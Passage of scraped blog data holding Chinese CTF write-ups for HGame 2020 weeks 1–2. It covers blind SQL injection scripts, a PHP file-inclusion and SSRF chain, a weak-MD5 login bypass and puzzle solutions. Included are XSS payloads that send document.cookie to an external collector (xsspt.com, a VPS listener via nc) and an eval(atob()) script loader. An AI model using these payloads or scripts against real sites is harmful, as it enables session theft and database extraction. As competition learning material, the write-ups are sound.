首先是找漏洞。题目名称明显是week2留言板的后续，也就是说多半是sql注入。开始进去一个登录框，提供了注册功能。所以先注册一个账号登进去。期间容易发现对用户名的过滤很严格；进去后发现一个留言板。通常留言板多半是xss或者sql注入了吧。于是尝试留几个言。发现都不行。这时注意到一个删除功能，点击删除功能时出现的url是这样的： 1index.php?method&#x3D;delete&amp;delete_id&#x3D;1101 开始我的第一想法是这样的：(参考网上搜到的文章：https://juejin.im/entry/5c11e35b51882530e46188ed）这道题目难度显然要高不少，但给我很大启发。其注入点在于删除操作中的语句 1$result &#x3D; $conn-&gt;query(&quot;delete from note where id&#x3D;$id and user&#x3D;&#39;$user&#39;&quot;); 其中$user是可注的。所以那道题目在执行删除操作时就可以触发已经注入的名字，引起二次注入。这也是我开始对留言板这题的判断：二次注入。但是尝试注册时发现过滤的实在是太多了，基本不可能注册一个sql语句，看来是在其他地方可注。之后又重新注意到上面提到的删除语句，发现一件事，当我在burp里不改变delete_id重复发包时，结果都显示的删除成功。也就是说，这个操作并没有真正删掉我们的语句。仔细FUZZ的话，发现只要id传数字，任何数字都不会报错。判断是数值型注入。但是回显就很难受了，尝试 1delete_id&#x3D;1 and 1&#x3D;1 1delete_id&#x3D;1 and 1&#x3D;2 的回显都是删除成功。这就不太妙了。而且经过FUZZ后并没有过滤掉关键字。只能尝试盲注，而且是时间盲注。这里吐槽下题目，自己做时题目的id已经五千多，删除操作每次都贼卡。我用脚本测试时间盲注最简单的语句 1delete_id&#x3D;if(length(database())&lt;100,sleep(5),1) 都没有延迟，一度让我怀疑这个参数是否可注了。然而同样的payload第二天早上跑(估计因为做题的人这时候并不多)就测出有延时。难受，浪费了我好长时间自我怀疑。所以贴下脚本吧，题目对关键字并没有过滤，唯一的问题就是环境不好，每次跑都跑不出完整结果。只有最后一次叫出题人重启环境时才成功跑出每一个字符。 123456789101112131415161718192021222324import requestsflag=''cookies=&#123; 'PHPSESSID':'f9nl4jl987d07pisnq508o1kg7'&#125;for i in range(1,40): print(i) for j in range(32,128): url = \"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select group_concat(password) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(10),1)\" #if(length(database())=\"+str(i)+\",sleep(6),1)\" 7 #if(ascii(substr(database(),1,1))=\"+str(i)+\",sleep(6),1) babysql #if(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) messages , user #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='messages'),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) message-id ,user-id,message #if(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) id, name,password #if(ascii(substr((select group_concat(name) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) cosmos, # if(ascii(substr((select group_concat(password) from user),\"+str(i)+\",1))=\"+str(j)+\",sleep(6),1) f1FXOCnj26Fkadzt4Sqynf6O7CgR try: result = requests.get(url, cookies=cookies, timeout=10) except requests.exceptions.ReadTimeout: flag+=chr(j) print(flag) break 开始都是sleep(6)也能注,后来不得不调整到sleep(10)才好转了。总之题目是比较基本的时间盲注，但我估计很多人因为环境本来可以做的最后都不得不放弃。最后是注出user表里的cosmos跟密码，登录即可。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"杭电hgame-week2","slug":"杭电hgame-week2","date":"2020-01-31T02:57:30.000Z","updated":"2021-02-18T05:08:34.640Z","comments":true,"path":"2020/01/31/杭电hgame-week2/","link":"","permalink":"https://www.bycsec.top/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/","excerpt":"第二周的题目明显难度提升了些许，不过稍微花点时间还是能做的。因为时间原因只做了web，但是能ak掉web已经算不错了hhh。希望在后面两个week还能继续如此吧。其中因为第四道题花了很长时间才做出来，干脆总结下做题经验顺便当学习笔记写写。","text":"第二周的题目明显难度提升了些许，不过稍微花点时间还是能做的。因为时间原因只做了web，但是能ak掉web已经算不错了hhh。希望在后面两个week还能继续如此吧。其中因为第四道题花了很长时间才做出来，干脆总结下做题经验顺便当学习笔记写写。 Cosmos的博客后台个人觉得这道题出的挺不错的。至少把我之前淡忘的几个知识点都整合到一起。也顺便提醒了我接下来的学习笔记要写啥hhh。 首先进去一个登陆框。第一反应当然是sql注入。但是回显很有意思。 这个“用户名或密码错误”回显直接否定了我们任何关于sql注入的可能。加上没什么隐藏信息，导致我当时这题就先放着去做第二道了。之后回过头看时，才想起来要抓个包。于是发现存在一个跳转 看到action就立马有了新思路。因为这正是文件包含漏洞利用的必备参数。那么就试试读文件吧。果断尝试伪协议。 1?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php 这里自己被自己之前写的文章坑到了……原来一时兴起写了个“伪协议总能给你惊喜”，结果文章里注重php://input，但没有发现php://filter读文件的payload写错了…..自己有点淡忘就拿文章里的payload复制粘贴，结果半天不出结果。后来才发现自己写错了。总之读到源码,base64解码后：index.php 1234567891011121314151617181920212223&lt;?phperror_reporting(0);session_start();if(isset($_SESSION['username'])) &#123; header(\"Location: admin.php\"); exit();&#125;$action = @$_GET['action'];$filter = \"/config|etc|flag/i\";if (isset($_GET['action']) &amp;&amp; !empty($_GET['action'])) &#123; if(preg_match($filter, $_GET['action'])) &#123; echo \"Hacker get out!\"; exit(); &#125; include $action;&#125;elseif(!isset($_GET['action']) || empty($_GET['action'])) &#123; header(\"Location: ?action=login.php\"); exit();&#125; 发现admin.php的存在，以及login.php可能存在猫腻。 那也用伪协议读下login.php 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude \"config.php\";session_start();//Only for debugif (DEBUG_MODE)&#123; if(isset($_GET['debug'])) &#123; $debug = $_GET['debug']; if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) &#123; die(\"args error!\"); &#125; eval(\"var_dump($$debug);\"); &#125;&#125;if(isset($_SESSION['username'])) &#123; header(\"Location: admin.php\"); exit();&#125;else &#123; if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; if ($admin_password == md5($_POST['password']) &amp;&amp; $_POST['username'] === $admin_username)&#123; $_SESSION['username'] = $_POST['username']; header(\"Location: admin.php\"); exit(); &#125; else &#123; echo \"用户名或密码错误\"; &#125; &#125;&#125;?&gt;#html部分略 admin.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phpinclude \"config.php\";session_start();if(!isset($_SESSION['username'])) &#123; header('Location: index.php'); exit();&#125;function insert_img() &#123; if (isset($_POST['img_url'])) &#123; $img_url = @$_POST['img_url']; $url_array = parse_url($img_url); if (@$url_array['host'] !== \"localhost\" &amp;&amp; $url_array['host'] !== \"timgsa.baidu.com\") &#123; return false; &#125; $c = curl_init(); curl_setopt($c, CURLOPT_URL, $img_url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $res = curl_exec($c); curl_close($c); $avatar = base64_encode($res); if(filter_var($img_url, FILTER_VALIDATE_URL)) &#123; return $avatar; &#125; &#125; else &#123; return base64_encode(file_get_contents(\"static/logo.png\")); &#125;&#125;?&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Cosmos'Blog - 后台管理&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"logout.php\"&gt;退出登陆&lt;/a&gt; &lt;div style=\"text-align: center;\"&gt; &lt;h1&gt;Welcome &lt;?php echo $_SESSION['username'];?&gt; &lt;/h1&gt; &lt;/div&gt; &lt;form action=\"\" method=\"post\"&gt; &lt;fieldset style=\"width: 30%;height: 20%;float:left\"&gt; &lt;legend&gt;插入图片&lt;/legend&gt; &lt;p&gt;&lt;label&gt;图片url: &lt;input type=\"text\" name=\"img_url\" placeholder=\"\"&gt;&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;button type=\"submit\" name=\"submit\"&gt;插入&lt;/button&gt;&lt;/p&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;fieldset style=\"width: 30%;height: 20%;float:left\"&gt; &lt;legend&gt;评论管理&lt;/legend&gt; &lt;h2&gt;待开发..&lt;/h2&gt; &lt;/fieldset&gt; &lt;fieldset style=\"width: 30%;height: 20%;\"&gt; &lt;legend&gt;文章列表&lt;/legend&gt; &lt;h2&gt;待开发..&lt;/h2&gt; &lt;/fieldset&gt; &lt;fieldset style=\"height: 50%\"&gt; &lt;div style=\"text-align: center;\"&gt; &lt;img height='200' width='500' src='data:image/jpeg;base64,&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(\"static/error.jpg\")); ?&gt;'&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;/body&gt;&lt;/html&gt; 那么不难发现几个源码里的要点：index.php中：ban掉了flag与config。而后面可以注意到config.php被admin.php与login.php包含(include)了。 login.php中1.存在一个参数debug,以及对这参数的eval()。也就是说我们获得了一个可控可执行的参数，但是要绕正则。2.稍微注意下，登录时username以及password均需与对应的参数（肯定在config.php中，所以我们不可能通过其他途径登录）相等。但是password偏偏是==的弱类型相等。这就代表password一定会有漏洞。且甚至可以猜到，password的md5值开头是0e。这样才会有弱类型比较漏洞利用。 admin.php中1.下面一段代码 123456$c = curl_init();curl_setopt($c, CURLOPT_URL, $img_url);curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);$res = curl_exec($c);curl_close($c);$avatar = base64_encode($res); 有点眼熟，再加上前面一段对host的判别，可以想见是存在ssrf漏洞。（虽然我不熟）百度一下，发现这果然是ssrf漏洞的经典代码。也提醒了我要准备学习ssrf的笔记了…… 然后就是存在一个图片插入的功能。而且它会返回base64编码后的file_get_contents()结果。这也是ssrf利用中能拿到回显结果的重要细节。 所以思路很清晰了，从login.php下手，登录后台，利用ssrf拿到根目录下的flag。 首先是关于debug参数的利用了。 1234if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) &#123; die(\"args error!\"); &#125; eval(\"var_dump($$debug);\"); 主要是这段代码，自己开始只理解成过滤了一堆东西……后来百度下，突然想起来原来ichunqiu上做过的一道题。叫做爆破-1。但实际上是一个全局变量的利用（因为它include了flag.php,所以传参globals就能通过eval($$a)拿flag）。而这题同样也include了config.php……回过头看正则，就会发现这个正则其实恰好限定了传参为变量名。具体参考stackoverflow：https://stackoverflow.com/questions/3980154/how-to-check-if-a-string-can-be-used-as-a-variable-name-in-php它要求开头第一个字母可以是字母下划线及不可见字符，后面其他字母可以是字母数字及不可见字符。（\\x7f-\\xff 确切的说，可以匹配utf-8编码中的非ascii编码字符）。总之确定可以传参数后，我们试试GLOBALS直接拿到用户名Cosmos!，以及密码是0e开头的事实。故选个0e开头MD5的字符串登录进去。 12Cosmos!s878926199a 进去后我也卡了好久……ssrf不熟，只能盲目的试。能确定的是需要host被解析为localhost,尝试直接http://localhost但是回显总是那张报错的图。唯一不同的在于，当我尝试http://localhost/flag时，返回的是404,也就是说curl成功执行了。所以说，flag应该是在服务器根目录，不是网站根目录。问题变为怎么读了。在查阅资料时突然注意到file协议可以读文件。于是换下file://协议居然成了。。。解码可拿到flag。后来郁师傅解释说，因为index.php存在302，curl不能跟随，获取是空的。结合源码中获取为空则返回错误图片这点，就明白了为什么http://localhost总是没结果但我估计还有其他方法做，这里马一手。 Cosmos的留言板-1说来惭愧，这题开始我ip又被ban了hhhh。好在貌似是题目问题，后来出题人调整了就好了。首先根据FUZZ可以确认存在sql注入。输入1回显正常，输入1&#39;无回显。输入1&quot;回显正常。那么显然，这是盲注的味道。因为只有正确错误两种回显方式，所以确认是布尔盲注。 然后fuzz了下ban掉的关键字：空格，可以用%0a替代 1select 关键字可以双写绕过 那不多说直接放盲注脚本了。整体还是比较简单的（之前总结的模板直接拿来套hhh）： 12345678910111213141516import requestsflag=''#hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;for i in range(1,50): a=0 print(i) for j in range(32,128): payload=\"http://139.199.182.61/index.php?id=1'and%0aascii(substr((selselectect%0afl4444444g%0afrom%0af1aggggggggggggg),\"+str(i)+\",1))=\"+str(j)+\"%23\" #print(payload） res=requests.get(url=payload) if 'Hello' in res.text: flag+=chr(j) print(flag) a=1 if a==0: break Cosmos的新语言这道题确切说不算难题吧。但是自己仍然耗费了2个多小时在这上面，感觉挺划不来的…… 话不多说，先看题目 初始进去发现有源码及回显。源码很简洁，关键在于file_get_contents(&#39;mycode&#39;);开始习惯性以为是file_get_contents()的命令执行漏洞。但是仔细看，我们并没有可控参数。因为这里的&#39;mycode&#39;指代的其实是filename,如果有疑问，那么不妨放到php中看看也就是说，mycode是一个文件，而且回显的不知名内容也是mycode里面的。 回显就不简单了，看似是base64，但解码后仍然是未知编码。那么我们从mycode下手。由源码可知，mycode应该是跟index.php在同一个目录下的，故访问之。得到源码可以知道，它定义了一个加密函数，并对$_SERVER[&#39;token&#39;]进行了多重编码。只要我们post的token与服务器的token相同即可拿到flag。 开始我想，这不是很简单吗，把编码倒过来解码不就好了？但是解出token后发现没有拿到flag，仔细回到原页面，发现一个大问题：mycode中用于加密$_SERVER[&#39;token&#39;]的源码是变化的。唯一不变的是加密函数的数量总是10个，而加密函数的种类只有encrypt(),base64_encode(),strrev(),str_rot13()而这体现在index.php上回显的内容也是不断变换的。且基本上几秒钟就换掉了。也就是说，我们只能靠脚本解决，而不可能人手解决。(当然，也许可以把几种孤零零的加密顺序的可能性不断试也许刚好碰对了。但这无异于大海捞针，就没有意义了。) 首先这里先权衡下脚本的书写方式。开始我是想用php脚本的。但是我不会php中与python里requests库有相同功能的知识，那就只能用python脚本了。但随之而来的问题是，我们需要把加密的函数改一改，而且python里还没找到rot-13decode的库……（我就是因为找了个错的rot-13解码脚本导致白花了快一个小时） 所以我的思路是这样的，请求两个页面，分别用正则拿到回显内容，以及mycode里10个加密函数组成的字符串。我再另写一个函数匹配字符串，每匹配到一个函数名字符串执行对应的解密函数。（稍微解释下，因为自己一开始弄反了。我们解密是要对回显内容从外向里解，故调用的函数顺序与我们从mycode里获得加密函数字符串中函数的顺序是一致的。比如加密方式： 1$密码&#x3D;base64_encode(str_rot13(strrev($原码))) 我们需要： 1echo(strrev(str_rot13(base64_decode($密码)))) 来得到原码。但我封装好的匹配函数的调用顺序仍是 1base64_decode , str_rot13(), strrev() 被自己一开始的php脚本的固化印象影响，弄反了顺序导致老是报错。不太应该。话不多说，贴脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport reimport base64def str_rot13(s, OffSet=13): def encodeCh(ch): f = lambda x: chr((ord(ch) - x + OffSet) % 26 + x) return f(97) if ch.islower() else (f(65) if ch.isupper() else ch) return ''.join(encodeCh(c) for c in s)def strrev(str): return str[::-1]def decrypt(str): res='' for i in range(0,len(str)): res+= chr(ord(str[i]) - 1) return resdef exec(string,token): if string=='encrypt': return decrypt(token) if string=='str_rot13': return str_rot13(token) if string=='base64_encode': f=str(base64.b64decode(token),'utf-8') return f if string=='strrev': return strrev(token)url='http://76c59cdfab.php.hgame.n3ko.co'url1='http://76c59cdfab.php.hgame.n3ko.co/mycode'res=requests.get(url)res1=requests.get(url1)key=re.findall(r'(.*)&lt;br&gt;',res.text)[2]#print(key)key1=re.findall(r'echo\\((.*)\\$',res1.text)[0]#print(key1)key1=key1.replace('(','&lt;br&gt;')#print(key1)token=keyprint('\\n')for i in range(0, 10): text = re.findall(r'(.*?)&lt;br&gt;', key1)[i] token=exec(text,token)print(token)data=&#123; 'token':token&#125;flag=requests.post(url=url,data=data)print(flag.text) 其中为了方便，把几个解密函数重新封装一下。decrypt()很好写，str_rot13()从网上嫖的。exec()就是用于匹配字符串并执行的函数，注意其中的base64要转字符串形式，不然解出来是二进制data；之后的key与key1分别用于获取请求的内容中我们要利用的回显与函数部分。这里需要自己调整一下,比如： 1key&#x3D;re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2] 我用re的findall()函数，由于返回的是列表故要记得根据res.text调整对应的下标。之后我也用正则函数，匹配出函数字符串，去掉括号部分，并在之后调用exec()函数时，再次利用findall()的匹配得到函数名组成的列表，依次调用。最后解出token，post请求拿到flag。从flag也可以看出，我们也能用php脚本……然而我tcl而不会，不然可以省掉不少时间。 Cosmos的聊天室 花了最长时间的一道题……但毕竟是对我来说最难的一道了，做的非常辛苦但是又有许多收获。所以就着重笔墨多记录下这道题，顺便当自己的学习笔记好了。 进入界面 首先当然是判断漏洞类型了。从题目名字可以知道，可能是个前端漏洞。由于界面开始就提供了一个Flag is here的button。点击进去后发现提示这里直接说明我们需要admin的token才能拿到flag。好的，前端+token，应该不难想到需要我们通过xss打到admin的cookie来获取token了。然后整理下思路，大概是如此:通过message提交payload。然后下面一个验证码code用脚本跑出来。每次点击’提交’时，就会把之前传过的所有message都发给bot。bot自然是带有admin权限的了，那么它访问时触发我们的payload,我们拿到token就可以访问/flag了。 下面的验证方式并不难，只是会强行耗时间。通常用脚本跑出来都是7,8位数。 12345678import hashlibfor i in range(1,999999999): code=hashlib.md5(str(i).encode('utf-8')).hexdigest() print(code[:6]) if code[:6]=='bfa9a6': print(i) break 但是message的处理就不简单了。简单的fuzz后会发现存在过滤与特殊处理。这点之后再说。好在题目说明了，等我们测试成功后再提交验证码。这样所有内容都能交到adminbot手上，不至于狂跑脚本浪费时间。 其实自己在这道题之前并没有真正意义上做过xss打cookie类型的题目。头一次听说是在校赛上一道simple_xss的题目。那道题就是简单的过滤下用xss打cookie（当时题目出了不少bug，甚至源码泄露直接拿flag都行……）。不过我只知道最基础的xsspayload，根本不会利用xss打cookie。于是自己先选择百度+google，得知需要xss平台。我用的这个在线网站：http://xsspt.com/于是明白，其实就是在xss平台创建一个项目，添加默认模板以及xss.js模板,之后只要在xss漏洞处尝试平台提供给我们的payload即可。比如：即可执行xss打cookie。上面项目几个记录都是我在本地的DVWA上用xss-reflected这个漏洞的low级别的输入打的。 同时也注意到几点，以上payload基本上是这样几个形式 123451.&lt;script src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&gt;&lt;&#x2F;script&gt;2.&lt;img src&#x3D;x onerror&#x3D;eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk&#x3D;&#39;))&gt;3.javascript:eval(&#39;window.s&#x3D;document.createElement(&quot;script&quot;);window.s.src&#x3D;&quot;&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&quot;;document.body.appendChild(window.s)&#39;) 我分之为3种：1.&lt;script&gt;标签的经典payload。src属性是外部引用2.&lt;img&gt;标签的onerror属性，也是一种经典payload。同时用上eval(atob())处理base64字符串来bypass。还原下是这样的： 1s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn?&#39;+Math.random() 3.以及第三种javascript伪协议。有效避免了尖括号的存在。上面1,2两种payload我都用DVWA打到cookie了。第三种不行。 回到题目中来，这道题目的过滤比想象中严格的多。我把做题时的FUZZ结果贴下： 1231.script关键字被转为 Hi there!2.输入内容转为大写3.标签整体过滤&lt;&gt; 第一点还好，script过滤了还有诸如img,svg/onload等等payload。第二点有点难办，因为通常标签包括属性大写后仍然能正常处理（大写绕过是一种常见的绕过script的方法），但是连属性的值都大写会严重影响我的payload正常执行。比如ALERT(1)是没法执行的。xss平台上第二种payloadbase64+eval()也是不行的。因为大写后函数不能正常执行了，编码也错误了。第三点非常难办，只要有标签就给滤掉。没有什么别的绕过方法。所以xss平台提供的payload全军覆没，必须想绕过方法。 这时我想到了去年暑假自己写的一篇文章。是关于xss.me上的xss挑战的。当时基本上一路看着wp做过来，好多都没什么印象。但现在再看却发现了意外宝藏：https://www.jianshu.com/p/18473e2174f3比如还有： 所以这里可以不闭合标签，利用实体编码完成xss。(没想到要靠自己的文章解决……好嘲讽啊)好的，解决了尖括号与大写的问题后再解决一下script的问题吧。这里我找到了sky师傅之前做的xss题目以及他做往年hgame时对xss的绕过。https://skysec.top/2018/08/17/xss-ssrf-redis/https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/ 第一道题xss部分过滤了许多关键字，比如script以及onerror但是可以用 1&lt;svg/onload=\"document.location='vpsip:port'\"&gt; (这里同时也提醒我，不一定要用xss平台，用vps上的nc监听也可以。)同时用下面的payload打cookie: 1&lt;svg/onload=\"document.location='vpsip:port/?'+document.cookie\"&gt; 这里是用网页ip后的参数带出cookie。看到后面我的结果就明白了。加上师傅hgame的payload其中的charcode部分其实就是 1window.location.href=\"vpsip:port/?s=\"+document.cookie; 所以明白了获取cookie的payload格式。那么对此题，我们的理想payload就是 1&lt;svg/onload=\"window.location.href=\"ip:7788/?s=\"+document.cookie;\"&gt; 这里我出于隐私把自己的ip滤掉，只显示我监听的是7788端口。 那么编码，去尖括号后，我们实际提交的payload为：(这里我把ip换成127.0.0.1) 1&lt;svg/onload=\"&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;\" 在题目界面提交后我们看看有没有成功插入可以看到，虽然回显显示的一个无内容的方框。但我的payload被成功解析。同时在vps上监听端口7788 1nc -lvp 7788 提交脚本跑出来的code，收到Success的同时查看服务器成功带出token。那么用bp换token访问/flag吧。 这道题真的花了很久。毕竟自己在此之前没接触过一道xss打cookie的真题。但是还是靠着网上知识学到了许多，成功拿到自己的flag。所以要多多向各位dalao以及百度谷歌学习啊。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"杭电hgame-week1","slug":"杭电hgame-week1","date":"2020-01-30T03:11:17.000Z","updated":"2021-02-18T05:08:33.444Z","comments":true,"path":"2020/01/30/杭电hgame-week1/","link":"","permalink":"https://www.bycsec.top/2020/01/30/%E6%9D%AD%E7%94%B5hgame-week1/","excerpt":"萌新的第一次hgame开始了。week1的难度比较友好，至少从web上来说是这样的，自己目标也不高，争取做到每个week能akweb就满足了。这次的web整体上比较简单，除了我自己被坑到的codeworld（中间居然被ban了ip,我只是用脚本post了一次 ，没拿扫描器扫啊啊啊）剩下的3题加起来基本1小时以内就能做完hh。除此之外还试了试密码学跟misc的简单题，也都写一写过程吧。（另外体会到re,pwn真的是爸爸，爷爷，排名高的基本都是二进制的……,我什么时候才能学会二进制啊） 看到官方发布了才发的，那就贴下官方的：https://github.com/vidar-team/Hgame2020_writeup","text":"萌新的第一次hgame开始了。week1的难度比较友好，至少从web上来说是这样的，自己目标也不高，争取做到每个week能akweb就满足了。这次的web整体上比较简单，除了我自己被坑到的codeworld（中间居然被ban了ip,我只是用脚本post了一次 ，没拿扫描器扫啊啊啊）剩下的3题加起来基本1小时以内就能做完hh。除此之外还试了试密码学跟misc的简单题，也都写一写过程吧。（另外体会到re,pwn真的是爸爸，爷爷，排名高的基本都是二进制的……,我什么时候才能学会二进制啊） 看到官方发布了才发的，那就贴下官方的：https://github.com/vidar-team/Hgame2020_writeup WEBCosmos 的博客显然提示的是源码泄露。那么就果断GitHack走起。可是拿下来的结果只有index.html与css文件。这时候一开始我陷入了错误的想法，具体参考原来ichunqiu上做过的‘登陆’一题。于是我使用了能够回滚的githack，在它爬下的objects里一个个找（具体方法如下） 1git cat-file -p &#x2F;两位数&#x2F;文件名 查看完所有objects也没有什么收获，除了出题人的github……那么是否是历史回滚呢？但用git找却只找到一个版本，感觉不太对劲。那就上github上找找吧……结果还真有。下面的版本中就有flag的base64编码 接头霸王题目上来没啥提示，除了一张接头霸王的图片跟you need to come from vidar.club 要说web里跟头有关的，那只能是抓包里常见的Header了。加上come from 某个网址，不难知道就是http Header中referer这个属性。这个属性之所以有名，跟它将错就错的拼写有关，正确拼写显然是referrer,而这个错误拼写是早期规范的错误因为向后兼容遗留至今的。其作用是告诉服务器我们访问者是从哪链接过来的，从而进行区别处理。那么先加referer头 提示要从本地访问，那就更熟悉不过了，因为这用到已经烂熟于心的XFF头了。常常用于伪造ip。所以我们令XFF头为127.0.0.1.提示改浏览器，那只需改User-Agent 头，加上cosmos即可。flag要在2077后更新？一看到2077我就想到去年新手上场的中科大hackergame里的信息安全2077，那道题就是通过改header中一个属性来拿flag。这道题应该也一样吧……那么我们要改什么属性呢？先来看看response:注意到有Last-Moified这一属性，而requests的请求头中与之对应的就是If-Unmodifed-Since,其官方解释 HTTP协议中的 If-Unmodified-Since 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 POST 或其他 non-safe 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 412 (Precondition Failed) 错误。 所以改好时间在2077之后： code world 这道题做出来的人数算是所有web里面最少的了,但是自己一开始傻傻的卡了好久…… 开始一个403,不过作为ctfer,千万不要相信这个403是真正的403，那么先抓个包，果不其然提示存在302，那么直接访问index.php吧，抓包后发至repeater发现存在405,那么果断改成POST请求方式，得到： 那么提示通过url传值，那果断传/?a=5+5啊，结果返回说“再想想”。自己顿时陷入迷茫，一开始想是不是不是用+连接，后来又想，基于题目是codeworld，是不是要代码执行?但是fuzz了一下，发现并没有回显执行的点。于是陷入迷茫。后来，自己在检查自己抓的包时，意外发现了一点：对了！在进行get传值时，他会把加号处理成空。也正因如此，题目才会要求url传值并使用相加这种方式来设置限定。所以payload即为 1&#x2F;?a&#x3D;5%2B5 🐔尼泰玫游戏题hhh但从游戏角度过分难了。显然游戏只是幌子，应该找到网站里能post值的操作，于是尝试狂点‘开始游戏’，果然提示需要300000分时抓到post包。改包就好。 CryptoInfantRSA有生之年还能做出RSA……因为看到RSA几个参数提示的很清楚就干脆去网上嫖脚本了。在装库的时候就很无奈，gmpy2总是弄不好。最后去找了个whl，pip install下总归能用了 12345678910111213141516import gmpy2import binasciip = gmpy2.mpz(681782737450022065655472455411)q = gmpy2.mpz(675274897132088253519831953441)e = gmpy2.mpz(13)phi_n = (p-1)*(q-1)d = gmpy2.invert(e, phi_n)c = gmpy2.mpz(275698465082361070145173688411496311542172902608559859019841)m = pow(c, d, p*q)print(\"十进制:\\n%s\"%m)m_hex = hex(m)[2:]print(\"十六进制:\\n%s\"%(m_hex,))#print(\"ascII:\\n%s\"%((binascii.b2a_hex(hex(m)[2:])).decode('hex'),))print(\"ascii:\\n%s\"%(binascii.a2b_hex(m_hex).decode(\"utf8\"),)) misc欢迎参加HGame！1Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t 一开始不太清楚这是什么编码，后来百度一下发现就是base64。回头想想，发现毕竟是数字+字母的组合，可以考虑base系的编码。解码后为morse电码，在线解一下就好了。 壁纸题目下下来打开是个图片，扔winhex里看发现末尾提示flag.txt以及密码是图片id，图片名则标注了pixiv。。。估计是要改成压缩包了，所以也没去看有没有压缩包文件，头就直接改zip，果不其然是压缩包，内容为flag.txt，需要密码。那就直接上p站找这个画师吧（感觉吃了一波强行安利啊）找到图片后用密码看flag.txt，最后结果ascii解码一下就好。 签到题ProPlus一时兴起还是看了看这道misc。上来先给了一个压缩包一个文件，文件内容 123456Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fenses first, Five Caesar next. English sentense first, zip password next. 看到fences跟ceaser就想到了栅栏跟凯撒密码了。加上提示先3栅栏，再5凯撒，那么在线解下码，对应组数与偏移数分别为3,5即可。解出来前面一句话如下：Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.出自百年孤独，不知道有什么用。解出的密码用来解压加密的压缩包，得到文档 1234data:text;ook,Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. 